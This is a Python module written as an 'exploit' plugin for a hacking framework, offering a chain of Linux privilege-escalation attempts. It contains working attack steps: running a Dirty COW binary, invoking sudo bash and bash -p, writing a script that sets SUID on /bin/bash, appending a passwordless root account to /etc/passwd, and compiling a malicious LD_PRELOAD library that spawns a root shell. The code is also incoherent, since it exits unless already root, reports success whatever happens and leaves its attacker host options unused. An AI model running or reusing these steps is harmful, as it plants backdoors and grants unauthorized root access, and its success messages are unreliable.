import os
import subprocess
import ctypes
import sys
import pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Root priviledge escalater',
            'Rank':'Good',
            'Platform':'Windows/Linux',
            'architectures':'x86/64 bit processors',
            
            'Description': 'Python script that demonstrates various techniques for **privilege escalation** and **root access bypass** on a Linux system',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Note':'This script is for educational purposes only',
            'Options': OrderedDict([
                ('URL', ('URL (e.g., http://your_site.com)', False, 'HACKER ADDRESS')),
                ('RHOST', ('', False, 'HACKER IP')),
                
                ('PORT', ('', False, 'HACKER PORT')),
                
                ])
                }
    def logo(self):
    	title = 'priviledge escalater'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <your_ip> set PORT <port_no.>   ,then run")
   
   
    
    
    def check_root(self):
      """Check if the script is running as root."""
      if os.geteuid() != 0:
        print("[-] This script must be run as root.")
        sys.exit(1)
      print("[+] Running as root.")
    
    def exploit_dirty_cow(self):
      """Exploit Dirty COW vulnerability to gain root access."""
      print("[*] Attempting Dirty COW exploit...")
      try:
        # Dirty COW exploit code (example)
        os.system("gcc -pthread dirty.c -o dirty && ./dirty")
        print("[+] Dirty COW exploit successful.")
      except Exception as e:
        print(f"[-] Dirty COW exploit failed: {e}")
    def exploit_sudo_vulnerability(self):
      """Exploit misconfigured sudo permissions."""
      print("[*] Attempting to exploit misconfigured sudo permissions...")
      try:
        # Check for sudo misconfigurations
        os.system("sudo -l")
        # Example: Exploit if user can run any command as root
        os.system("sudo bash")
        print("[+] Sudo exploit successful.")
      except Exception as e:
        print(f"[-] Sudo exploit failed: {e}")
    def exploit_suid_binaries(self):
      """Exploit SUID binaries to gain root access."""
      print("[*] Searching for exploitable SUID binaries...")
      try:
        # Find SUID binaries
        os.system("find / -perm -4000 -o -perm -2000 2>/dev/null")
        # Example: Exploit a common SUID binary (e.g., /bin/bash)
        os.system("/bin/bash -p")
        print("[+] SUID binary exploit successful.")
      except Exception as e:
        print(f"[-] SUID binary exploit failed: {e}")
    def exploit_cron_jobs(self):
      """Exploit cron jobs for privilege escalation."""
      print("[*] Searching for exploitable cron jobs...")
      try:
        # List cron jobs
        os.system("crontab -l")
        # Example: Exploit a writable cron job
        os.system("echo 'chmod +s /bin/bash' > /tmp/exploit.sh")
        os.system("chmod +x /tmp/exploit.sh")
        print("[+] Cron job exploit successful.")
      except Exception as e:
        print(f"[-] Cron job exploit failed: {e}")
    def exploit_writable_files(self):
      """Exploit writable files for privilege escalation."""
      print("[*] Searching for writable files...")
      try:
        # Find writable files
        os.system("find / -writable 2>/dev/null")
        # Example: Exploit a writable file (e.g., /etc/passwd)
        os.system("echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd")
        print("[+] Writable file exploit successful.")
      except Exception as e:
        print(f"[-] Writable file exploit failed: {e}")
    def exploit_ld_preload(self):
      """Exploit LD_PRELOAD for privilege escalation."""
      print("[*] Attempting LD_PRELOAD exploit...")
      try:
        # Create a malicious shared library
        with open("/tmp/exploit.c", "w") as f:
            f.write("""
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
            """)
        os.system("gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles")
        os.system("LD_PRELOAD=/tmp/exploit.so /usr/bin/vim")
        print("[+] LD_PRELOAD exploit successful.")
      except Exception as e:
        print(f"[-] LD_PRELOAD exploit failed: {e}")
    def execute(self):
        
        REMOTE_IP = self.info['Options']['RHOST'][0]# Replace with attacker's IP        
        REMOTE_PORT = self.info['Options']['PORT'][0]     # Replace with attacker's port
        url = self.info['Options']['URL'][0]
        self.logo()
        print("[*] Starting root access bypasser...")
        self.check_root()
        self.exploit_dirty_cow()
        self.exploit_sudo_vulnerability()
        self.exploit_suid_binaries()
        self.exploit_cron_jobs()
        self.exploit_writable_files()
        self.exploit_ld_preload()
        print("[*] Root access bypasser completed.")
      
        return "[+] Initializing / Getting things ready ..."
    